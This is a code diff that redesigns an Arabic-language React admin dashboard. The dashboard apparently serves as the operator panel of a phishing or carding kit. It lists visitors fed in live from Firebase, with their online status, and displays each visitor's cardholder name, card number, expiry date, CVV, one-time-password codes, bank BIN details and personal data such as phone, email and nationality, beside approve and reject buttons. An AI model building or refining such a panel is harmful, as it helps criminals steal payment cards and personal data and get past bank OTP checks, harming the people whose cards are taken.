@@ -1,6 +1,20 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { RefreshCw, LogOut, Eye, CreditCard } from "lucide-react";
+import { 
+  RefreshCw, 
+  LogOut, 
+  CreditCard, 
+  User, 
+  Clock, 
+  MapPin, 
+  Phone, 
+  Mail,
+  Check,
+  X,
+  ChevronLeft,
+  Inbox,
+  Circle
+} from "lucide-react";
 import {
   subscribeToVisitors,
   subscribeToFormSubmissions,
@@ -10,12 +24,7 @@ import {
 } from "@/lib/firebase";
 import { useAuth } from "@/context/AuthContext";
 import { Button } from "@/components/ui/button";
-import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
+import { ScrollArea } from "@/components/ui/scroll-area";
 
 interface CombinedData {
   visitorId: string;
@@ -73,7 +82,7 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
     if (scheme === "visa") return "from-blue-600 to-blue-800";
     if (scheme === "mastercard") return "from-red-500 to-orange-500";
     if (scheme === "amex" || scheme === "american express") return "from-gray-600 to-gray-800";
-    return "from-emerald-600 to-teal-700";
+    return "from-slate-700 to-slate-900";
   };
 
   const getCardSchemeLogo = () => {
@@ -95,41 +104,38 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
   };
 
   return (
-    <div className={`w-full max-w-sm mx-auto rounded-2xl p-6 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-xl relative overflow-hidden`}>
-      <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
-      <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2"></div>
+    <div className={`w-full rounded-xl p-5 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-lg relative overflow-hidden`}>
+      <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
       
-      <div className="flex items-start justify-between mb-8 relative z-10">
+      <div className="flex items-start justify-between mb-6 relative z-10">
         <div>
           {binInfo?.bank?.name && (
-            <div className="text-white/90 text-sm font-medium mb-1">{binInfo.bank.name}</div>
+            <div className="text-white/90 text-sm font-medium">{binInfo.bank.name}</div>
           )}
           {binInfo?.country?.name && (
             <div className="text-white/60 text-xs">{binInfo.country.name}</div>
           )}
         </div>
-        <div className="bg-white/20 px-3 py-1 rounded text-sm font-medium">
-          {binInfo?.country?.currency || "SAR"}
-        </div>
+        {getCardSchemeLogo()}
       </div>
 
-      <div className="mb-6 relative z-10">
-        <div className="font-mono text-xl tracking-widest" dir="ltr">
+      <div className="mb-4 relative z-10">
+        <div className="font-mono text-lg tracking-widest" dir="ltr">
           {formattedNumber || "•••• •••• •••• ••••"}
         </div>
       </div>
 
       <div className="flex items-end justify-between relative z-10">
-        <div className="flex-1">
-          <div className="text-white/60 text-xs mb-1">حامل البطاقة</div>
+        <div>
+          <div className="text-white/60 text-xs mb-1">CARD HOLDER</div>
           <div className="font-medium text-sm uppercase tracking-wide">
             {paymentInfo.cardholderName || "N/A"}
           </div>
         </div>
         
-        <div className="flex gap-6 items-end">
+        <div className="flex gap-4 items-end">
           <div className="text-center">
-            <div className="text-white/60 text-xs mb-1">تاريخ</div>
+            <div className="text-white/60 text-xs mb-1">EXP</div>
             <div className="font-mono text-sm">{paymentInfo.expiryDate || "MM/YY"}</div>
           </div>
           
@@ -140,22 +146,19 @@ function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<strin
         </div>
       </div>
 
-      <div className="flex items-center justify-between mt-6 pt-4 border-t border-white/20 relative z-10">
-        <div className="flex items-center gap-2">
-          <span className={`px-2 py-0.5 rounded text-xs font-medium ${
-            binInfo?.type?.toLowerCase() === "debit" 
-              ? "bg-green-500/30 text-green-100" 
-              : "bg-purple-500/30 text-purple-100"
-          }`}>
-            {binInfo?.type?.toUpperCase() || "CARD"}
+      <div className="flex items-center gap-2 mt-4 pt-3 border-t border-white/20 relative z-10">
+        <span className={`px-2 py-0.5 rounded text-xs font-medium ${
+          binInfo?.type?.toLowerCase() === "debit" 
+            ? "bg-green-500/30 text-green-100" 
+            : "bg-purple-500/30 text-purple-100"
+        }`}>
+          {binInfo?.type?.toUpperCase() || "CARD"}
+        </span>
+        {binInfo?.brand && (
+          <span className="px-2 py-0.5 rounded text-xs font-medium bg-white/20">
+            {binInfo.brand}
           </span>
-          {binInfo?.brand && (
-            <span className="px-2 py-0.5 rounded text-xs font-medium bg-white/20">
-              {binInfo.brand}
-            </span>
-          )}
-        </div>
-        {getCardSchemeLogo()}
+        )}
       </div>
     </div>
   );
@@ -169,8 +172,6 @@ export default function AdminDashboard() {
   const [onlineCount, setOnlineCount] = useState(0);
   const [isLoading, setIsLoading] = useState(true);
   const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
-  const [showBuyerInfo, setShowBuyerInfo] = useState(false);
-  const [showPaymentInfo, setShowPaymentInfo] = useState(false);
   const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
   const [loadingBin, setLoadingBin] = useState(false);
 
@@ -204,7 +205,7 @@ export default function AdminDashboard() {
   }, [user]);
 
   const formatTimeAgo = (timestamp: any) => {
-    if (!timestamp?.toDate) return "N/A";
+    if (!timestamp?.toDate) return "";
     const date = timestamp.toDate();
     const now = new Date();
     const diff = now.getTime() - date.getTime();
@@ -212,9 +213,21 @@ export default function AdminDashboard() {
     const hours = Math.floor(diff / 3600000);
 
     if (minutes < 1) return "الآن";
-    if (minutes < 60) return `منذ ${minutes} دقيقة`;
-    if (hours < 24) return `منذ ${hours} ساعات تقريباً`;
-    return `منذ ${Math.floor(diff / 86400000)} يوم`;
+    if (minutes < 60) return `${minutes}د`;
+    if (hours < 24) return `${hours}س`;
+    return `${Math.floor(diff / 86400000)}ي`;
+  };
+
+  const formatFullTime = (timestamp: any) => {
+    if (!timestamp?.toDate) return "غير معروف";
+    const date = timestamp.toDate();
+    return date.toLocaleString("ar-SA", {
+      year: "numeric",
+      month: "short",
+      day: "numeric",
+      hour: "2-digit",
+      minute: "2-digit"
+    });
   };
 
   const handleLogout = async () => {
@@ -246,14 +259,10 @@ export default function AdminDashboard() {
     };
   });
 
-  const handleViewBuyerInfo = (data: CombinedData) => {
-    setSelectedData(data);
-    setShowBuyerInfo(true);
-  };
+  const filteredData = combinedData.filter(row => row.paymentInfo);
 
-  const handleViewPaymentInfo = async (data: CombinedData) => {
+  const handleSelectEntry = async (data: CombinedData) => {
     setSelectedData(data);
-    setShowPaymentInfo(true);
     setBinInfo(null);
     
     if (data.paymentInfo?.cardLast4) {
@@ -266,10 +275,10 @@ export default function AdminDashboard() {
 
   if (authLoading || isLoading) {
     return (
-      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
+      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
         <div className="text-center">
-          <RefreshCw className="w-8 h-8 text-[#8A1538] animate-spin mx-auto mb-4" />
-          <p className="text-gray-600">Loading dashboard...</p>
+          <RefreshCw className="w-8 h-8 text-slate-600 animate-spin mx-auto mb-4" />
+          <p className="text-slate-500">جاري التحميل...</p>
         </div>
       </div>
     );
@@ -280,330 +289,290 @@ export default function AdminDashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50" dir="rtl">
-      <div className="bg-white border-b border-gray-200 py-4 px-6">
-        <div className="flex items-center justify-between">
-          <div className="flex items-center gap-4">
-            <h1 className="text-xl font-bold text-[#8A1538]">
-              إدارة الإشعارات
-            </h1>
-            <span className="text-sm text-gray-500">
-              عرض وإدارة جميع الإشعارات والبيانات المستلمة (
-              {combinedData.filter(row => row.paymentInfo).length}) إشعار
-            </span>
+    <div className="h-screen bg-slate-100 flex flex-col" dir="rtl">
+      <header className="bg-white border-b border-slate-200 px-4 py-3 flex items-center justify-between gap-4 shrink-0">
+        <div className="flex items-center gap-3">
+          <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-slate-700 to-slate-900 flex items-center justify-center">
+            <Inbox className="w-5 h-5 text-white" />
           </div>
-          <div className="flex items-center gap-3">
-            <Button variant="outline" size="sm" className="text-gray-600">
-              مسح الكل
-            </Button>
-            <Button
-              onClick={handleLogout}
-              variant="ghost"
-              size="sm"
-              className="text-gray-600"
-            >
-              <LogOut className="w-4 h-4 ml-1" />
-              خروج
-            </Button>
+          <div>
+            <h1 className="text-lg font-semibold text-slate-800">لوحة التحكم</h1>
+            <p className="text-xs text-slate-500">{filteredData.length} رسالة</p>
           </div>
         </div>
-      </div>
+        
+        <div className="flex items-center gap-2">
+          <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-full">
+            <Circle className="w-2 h-2 fill-green-500 text-green-500" />
+            <span className="text-xs font-medium text-green-700">{onlineCount} متصل</span>
+          </div>
+          <Button
+            onClick={handleLogout}
+            variant="ghost"
+            size="sm"
+            className="text-slate-500"
+          >
+            <LogOut className="w-4 h-4" />
+          </Button>
+        </div>
+      </header>
 
-      <div className="p-6">
-        <div className="bg-white rounded-lg shadow-sm overflow-hidden">
-          <div className="overflow-x-auto">
-            <table className="w-full text-sm">
-              <thead className="bg-gray-50 border-b border-gray-200">
-                <tr>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الإجراءات
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    حامل البطاقة
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    OTP
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الاتصال
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الوقت
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الحالة
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    المعلومات
-                  </th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-600">
-                    الدولة
-                  </th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-gray-100">
-                {combinedData.filter(row => row.paymentInfo).length > 0 ? (
-                  combinedData.filter(row => row.paymentInfo).map((row) => (
-                    <tr key={row.visitorId} className="hover:bg-gray-50">
-                      <td className="px-4 py-3">
-                        <div className="flex items-center gap-2">
-                          <button className="p-1.5 rounded bg-gray-100 hover:bg-gray-200 text-gray-600">
-                            <Eye className="w-4 h-4" />
-                          </button>
-                          <button className="px-3 py-1 rounded text-xs font-medium bg-green-500 hover:bg-green-600 text-white">
-                            موافقة
-                          </button>
-                          <button className="px-3 py-1 rounded text-xs font-medium bg-red-500 hover:bg-red-600 text-white">
-                            رفض
-                          </button>
-                        </div>
-                      </td>
-                      <td className="px-4 py-3 text-gray-700 font-medium">
-                        {row.paymentInfo?.cardholderName || "-"}
-                      </td>
-                      <td className="px-4 py-3">
-                        {row.code ? (
-                          <span className="font-mono text-lg font-bold text-[#8A1538] bg-[#8A1538]/10 px-2 py-1 rounded">
-                            {row.code}
+      <div className="flex-1 flex overflow-hidden">
+        <div className="w-80 bg-white border-l border-slate-200 flex flex-col">
+          <ScrollArea className="flex-1">
+            <div className="divide-y divide-slate-100">
+              {filteredData.length > 0 ? (
+                filteredData.map((row) => (
+                  <div
+                    key={row.visitorId}
+                    onClick={() => handleSelectEntry(row)}
+                    className={`p-4 cursor-pointer transition-colors ${
+                      selectedData?.visitorId === row.visitorId
+                        ? "bg-slate-100"
+                        : "hover:bg-slate-50"
+                    }`}
+                    data-testid={`inbox-item-${row.visitorId}`}
+                  >
+                    <div className="flex items-start gap-3">
+                      <div className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${
+                        row.isOnline ? "bg-green-100" : "bg-slate-100"
+                      }`}>
+                        <User className={`w-5 h-5 ${row.isOnline ? "text-green-600" : "text-slate-400"}`} />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center justify-between gap-2 mb-1">
+                          <span className="font-medium text-slate-800 truncate text-sm">
+                            {row.paymentInfo?.cardholderName || "غير معروف"}
                           </span>
-                        ) : (
-                          <span className="text-gray-400">-</span>
-                        )}
-                      </td>
-                      <td className="px-4 py-3">
-                        <span
-                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
+                          <span className="text-xs text-slate-400 shrink-0">
+                            {formatTimeAgo(row.lastSeen)}
+                          </span>
+                        </div>
+                        <div className="flex items-center gap-2 mb-1">
+                          <span className="text-xs text-slate-500 truncate">
+                            {row.country} {row.city && `• ${row.city}`}
+                          </span>
+                        </div>
+                        <div className="flex items-center gap-2">
+                          {row.code && (
+                            <span className="font-mono text-xs font-bold text-amber-600 bg-amber-50 px-1.5 py-0.5 rounded">
+                              OTP: {row.code}
+                            </span>
+                          )}
+                          <span className={`text-xs px-1.5 py-0.5 rounded ${
                             row.isOnline
-                              ? "bg-green-100 text-green-700"
-                              : "bg-yellow-100 text-yellow-700"
-                          }`}
-                        >
-                          {row.isOnline ? "متصل" : "غير متصل"}
-                        </span>
-                      </td>
-                      <td className="px-4 py-3 text-gray-600">
-                        {formatTimeAgo(row.lastSeen)}
-                      </td>
-                      <td className="px-4 py-3">
-                        <span
-                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
-                            row.paymentSuccess
-                              ? "bg-green-100 text-green-700"
-                              : "bg-yellow-100 text-yellow-700"
-                          }`}
-                        >
-                          {row.paymentSuccess ? "موافق" : "معلق"}
-                        </span>
-                      </td>
-                      <td className="px-4 py-3">
-                        <div className="flex items-center gap-2">
-                          {row.buyerInfo ? (
-                            <button
-                              onClick={() => handleViewBuyerInfo(row)}
-                              className="px-2 py-1 rounded text-xs font-medium bg-blue-500 text-white hover:bg-blue-600"
-                            >
-                              معلومات شخصية
-                            </button>
-                          ) : (
-                            <span className="text-gray-400 text-xs">
-                              لا يوجد معلومات
-                            </span>
-                          )}
-                          {row.paymentInfo ? (
-                            <button
-                              onClick={() => handleViewPaymentInfo(row)}
-                              className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600 flex items-center gap-1"
-                            >
-                              <CreditCard className="w-3 h-3" />
-                              معلومات البطاقة
-                            </button>
-                          ) : (
-                            <span className="text-gray-400 text-xs">
-                              لا يوجد بطاقة
-                            </span>
-                          )}
+                              ? "bg-green-50 text-green-600"
+                              : "bg-slate-100 text-slate-500"
+                          }`}>
+                            {row.isOnline ? "متصل" : "غير متصل"}
+                          </span>
                         </div>
-                      </td>
-                      <td className="px-4 py-3">
-                        <div className="flex items-center gap-2">
-                          <span
-                            className={`w-2 h-2 rounded-full ${row.isOnline ? "bg-green-500" : "bg-gray-400"}`}
-                          ></span>
-                          <span className="text-gray-700">{row.country}</span>
-                        </div>
-                      </td>
-                    </tr>
-                  ))
-                ) : (
-                  <tr>
-                    <td
-                      colSpan={8}
-                      className="px-4 py-12 text-center text-gray-500"
-                    >
-                      لا توجد إشعارات حتى الآن
-                    </td>
-                  </tr>
-                )}
-              </tbody>
-            </table>
-          </div>
-        </div>
-      </div>
-
-      <Dialog open={showBuyerInfo} onOpenChange={setShowBuyerInfo}>
-        <DialogContent className="max-w-md" dir="rtl">
-          <DialogHeader>
-            <DialogTitle className="text-right text-[#8A1538]">
-              معلومات المشتري
-            </DialogTitle>
-          </DialogHeader>
-          {selectedData?.buyerInfo && (
-            <div className="space-y-3">
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    الاسم الكامل
-                  </span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.firstName}{" "}
-                    {selectedData.buyerInfo.lastName}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    البريد الإلكتروني
-                  </span>
-                  <span className="text-sm font-medium break-all">
-                    {selectedData.buyerInfo.email || "N/A"}
-                  </span>
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    رقم الهاتف
-                  </span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.phone || "N/A"}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الجنس</span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.gender || "N/A"}
-                  </span>
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الدولة</span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.country || "N/A"}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">المدينة</span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.city || "N/A"}
-                  </span>
-                </div>
-              </div>
-              <div className="grid grid-cols-2 gap-3">
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">الجنسية</span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.nationality || "N/A"}
-                  </span>
-                </div>
-                <div className="bg-gray-50 rounded-lg p-3">
-                  <span className="text-xs text-gray-500 block">
-                    الفريق المفضل
-                  </span>
-                  <span className="text-sm font-medium">
-                    {selectedData.buyerInfo.favoriteTeam || "N/A"}
-                  </span>
-                </div>
-              </div>
-            </div>
-          )}
-        </DialogContent>
-      </Dialog>
-
-      <Dialog open={showPaymentInfo} onOpenChange={setShowPaymentInfo}>
-        <DialogContent className="max-w-lg" dir="rtl">
-          <DialogHeader>
-            <DialogTitle className="text-right text-[#8A1538]">
-              معلومات البطاقة
-            </DialogTitle>
-          </DialogHeader>
-          {selectedData?.paymentInfo && (
-            <div className="space-y-4">
-              {loadingBin ? (
-                <div className="flex items-center justify-center py-8">
-                  <RefreshCw className="w-6 h-6 text-[#8A1538] animate-spin" />
-                  <span className="mr-2 text-gray-500">جاري تحميل معلومات البنك...</span>
-                </div>
-              ) : (
-                <CreditCardDisplay 
-                  paymentInfo={selectedData.paymentInfo} 
-                  binInfo={binInfo} 
-                />
-              )}
-              
-              <div className="grid grid-cols-2 gap-3 mt-4">
-                <div className="bg-[#8A1538]/10 rounded-lg p-4 text-center">
-                  <span className="text-xs text-[#8A1538]/70 block mb-1">OTP</span>
-                  <span className="text-2xl font-bold font-mono text-[#8A1538]">
-                    {selectedData.paymentInfo.otp || "-"}
-                  </span>
-                </div>
-                <div className={`rounded-lg p-4 text-center ${
-                  selectedData.paymentSuccess 
-                    ? "bg-green-100" 
-                    : "bg-red-100"
-                }`}>
-                  <span className={`text-xs block mb-1 ${
-                    selectedData.paymentSuccess 
-                      ? "text-green-600" 
-                      : "text-red-600"
-                  }`}>الحالة</span>
-                  <span className={`text-lg font-bold ${
-                    selectedData.paymentSuccess 
-                      ? "text-green-700" 
-                      : "text-red-700"
-                  }`}>
-                    {selectedData.paymentSuccess ? "ناجح ✓" : "فشل ✗"}
-                  </span>
-                </div>
-              </div>
-
-              {binInfo && (
-                <div className="bg-gray-50 rounded-lg p-4 mt-4">
-                  <h4 className="text-sm font-medium text-gray-700 mb-3">معلومات البنك</h4>
-                  <div className="grid grid-cols-2 gap-2 text-sm">
-                    <div>
-                      <span className="text-gray-500">البنك:</span>
-                      <span className="font-medium mr-1">{binInfo.bank?.name || "غير معروف"}</span>
-                    </div>
-                    <div>
-                      <span className="text-gray-500">الدولة:</span>
-                      <span className="font-medium mr-1">{binInfo.country?.name || "غير معروف"}</span>
-                    </div>
-                    <div>
-                      <span className="text-gray-500">النوع:</span>
-                      <span className="font-medium mr-1">{binInfo.type || "غير معروف"}</span>
-                    </div>
-                    <div>
-                      <span className="text-gray-500">الشبكة:</span>
-                      <span className="font-medium mr-1">{binInfo.scheme || "غير معروف"}</span>
+                      </div>
                     </div>
                   </div>
+                ))
+              ) : (
+                <div className="p-8 text-center">
+                  <Inbox className="w-12 h-12 text-slate-300 mx-auto mb-3" />
+                  <p className="text-slate-500 text-sm">لا توجد رسائل</p>
                 </div>
               )}
             </div>
+          </ScrollArea>
+        </div>
+
+        <div className="flex-1 bg-slate-50 flex flex-col">
+          {selectedData ? (
+            <>
+              <div className="bg-white border-b border-slate-200 p-4 shrink-0">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
+                      selectedData.isOnline ? "bg-green-100" : "bg-slate-100"
+                    }`}>
+                      <User className={`w-6 h-6 ${selectedData.isOnline ? "text-green-600" : "text-slate-400"}`} />
+                    </div>
+                    <div>
+                      <h2 className="font-semibold text-slate-800">
+                        {selectedData.paymentInfo?.cardholderName || "غير معروف"}
+                      </h2>
+                      <div className="flex items-center gap-2 text-sm text-slate-500">
+                        <MapPin className="w-3.5 h-3.5" />
+                        <span>{selectedData.country} {selectedData.city && `• ${selectedData.city}`}</span>
+                        <span className="text-slate-300">|</span>
+                        <Clock className="w-3.5 h-3.5" />
+                        <span>{formatFullTime(selectedData.lastSeen)}</span>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <Button variant="default" size="sm" className="bg-green-600 hover:bg-green-700">
+                      <Check className="w-4 h-4 ml-1" />
+                      موافقة
+                    </Button>
+                    <Button variant="destructive" size="sm">
+                      <X className="w-4 h-4 ml-1" />
+                      رفض
+                    </Button>
+                  </div>
+                </div>
+              </div>
+
+              <ScrollArea className="flex-1 p-6">
+                <div className="max-w-2xl mx-auto space-y-6">
+                  {selectedData.code && (
+                    <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center">
+                      <span className="text-sm text-amber-600 block mb-1">رمز التحقق OTP</span>
+                      <span className="font-mono text-3xl font-bold text-amber-700">
+                        {selectedData.code}
+                      </span>
+                    </div>
+                  )}
+
+                  {selectedData.paymentInfo && (
+                    <div className="bg-white rounded-xl border border-slate-200 p-5">
+                      <div className="flex items-center gap-2 mb-4">
+                        <CreditCard className="w-5 h-5 text-slate-600" />
+                        <h3 className="font-semibold text-slate-700">معلومات البطاقة</h3>
+                      </div>
+                      
+                      {loadingBin ? (
+                        <div className="flex items-center justify-center py-8">
+                          <RefreshCw className="w-5 h-5 text-slate-400 animate-spin" />
+                        </div>
+                      ) : (
+                        <CreditCardDisplay 
+                          paymentInfo={selectedData.paymentInfo} 
+                          binInfo={binInfo} 
+                        />
+                      )}
+
+                      <div className="grid grid-cols-3 gap-3 mt-4">
+                        <div className="bg-slate-50 rounded-lg p-3 text-center">
+                          <span className="text-xs text-slate-500 block mb-1">رقم البطاقة</span>
+                          <span className="font-mono text-sm font-medium text-slate-700" dir="ltr">
+                            {selectedData.paymentInfo.cardLast4 || "-"}
+                          </span>
+                        </div>
+                        <div className="bg-slate-50 rounded-lg p-3 text-center">
+                          <span className="text-xs text-slate-500 block mb-1">تاريخ الانتهاء</span>
+                          <span className="font-mono text-sm font-medium text-slate-700">
+                            {selectedData.paymentInfo.expiryDate || "-"}
+                          </span>
+                        </div>
+                        <div className="bg-slate-50 rounded-lg p-3 text-center">
+                          <span className="text-xs text-slate-500 block mb-1">CVV</span>
+                          <span className="font-mono text-sm font-bold text-slate-700">
+                            {selectedData.paymentInfo.cvv || "-"}
+                          </span>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                  {selectedData.buyerInfo && (
+                    <div className="bg-white rounded-xl border border-slate-200 p-5">
+                      <div className="flex items-center gap-2 mb-4">
+                        <User className="w-5 h-5 text-slate-600" />
+                        <h3 className="font-semibold text-slate-700">معلومات المشتري</h3>
+                      </div>
+                      
+                      <div className="grid grid-cols-2 gap-4">
+                        <div className="space-y-1">
+                          <span className="text-xs text-slate-500">الاسم الكامل</span>
+                          <p className="text-sm font-medium text-slate-800">
+                            {selectedData.buyerInfo.firstName} {selectedData.buyerInfo.lastName}
+                          </p>
+                        </div>
+                        
+                        {selectedData.buyerInfo.email && (
+                          <div className="space-y-1">
+                            <span className="text-xs text-slate-500">البريد الإلكتروني</span>
+                            <p className="text-sm font-medium text-slate-800 flex items-center gap-1">
+                              <Mail className="w-3.5 h-3.5 text-slate-400" />
+                              {selectedData.buyerInfo.email}
+                            </p>
+                          </div>
+                        )}
+                        
+                        {selectedData.buyerInfo.phone && (
+                          <div className="space-y-1">
+                            <span className="text-xs text-slate-500">رقم الهاتف</span>
+                            <p className="text-sm font-medium text-slate-800 flex items-center gap-1" dir="ltr">
+                              <Phone className="w-3.5 h-3.5 text-slate-400" />
+                              {selectedData.buyerInfo.phone}
+                            </p>
+                          </div>
+                        )}
+                        
+                        {selectedData.buyerInfo.nationality && (
+                          <div className="space-y-1">
+                            <span className="text-xs text-slate-500">الجنسية</span>
+                            <p className="text-sm font-medium text-slate-800">
+                              {selectedData.buyerInfo.nationality}
+                            </p>
+                          </div>
+                        )}
+                        
+                        {selectedData.buyerInfo.gender && (
+                          <div className="space-y-1">
+                            <span className="text-xs text-slate-500">الجنس</span>
+                            <p className="text-sm font-medium text-slate-800">
+                              {selectedData.buyerInfo.gender}
+                            </p>
+                          </div>
+                        )}
+                        
+                        {selectedData.buyerInfo.favoriteTeam && (
+                          <div className="space-y-1">
+                            <span className="text-xs text-slate-500">الفريق المفضل</span>
+                            <p className="text-sm font-medium text-slate-800">
+                              {selectedData.buyerInfo.favoriteTeam}
+                            </p>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {binInfo && (
+                    <div className="bg-white rounded-xl border border-slate-200 p-5">
+                      <h3 className="font-semibold text-slate-700 mb-4">معلومات البنك</h3>
+                      <div className="grid grid-cols-2 gap-4 text-sm">
+                        <div>
+                          <span className="text-slate-500">البنك:</span>
+                          <span className="font-medium text-slate-800 mr-2">{binInfo.bank?.name || "غير معروف"}</span>
+                        </div>
+                        <div>
+                          <span className="text-slate-500">الدولة:</span>
+                          <span className="font-medium text-slate-800 mr-2">{binInfo.country?.name || "غير معروف"}</span>
+                        </div>
+                        <div>
+                          <span className="text-slate-500">النوع:</span>
+                          <span className="font-medium text-slate-800 mr-2">{binInfo.type || "غير معروف"}</span>
+                        </div>
+                        <div>
+                          <span className="text-slate-500">العملة:</span>
+                          <span className="font-medium text-slate-800 mr-2">{binInfo.country?.currency || "غير معروف"}</span>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              </ScrollArea>
+            </>
+          ) : (
+            <div className="flex-1 flex items-center justify-center">
+              <div className="text-center">
+                <div className="w-16 h-16 rounded-full bg-slate-200 flex items-center justify-center mx-auto mb-4">
+                  <ChevronLeft className="w-8 h-8 text-slate-400" />
+                </div>
+                <p className="text-slate-500">اختر رسالة لعرض التفاصيل</p>
+              </div>
+            </div>
           )}
-        </DialogContent>
-      </Dialog>
+        </div>
+      </div>
     </div>
   );
 }
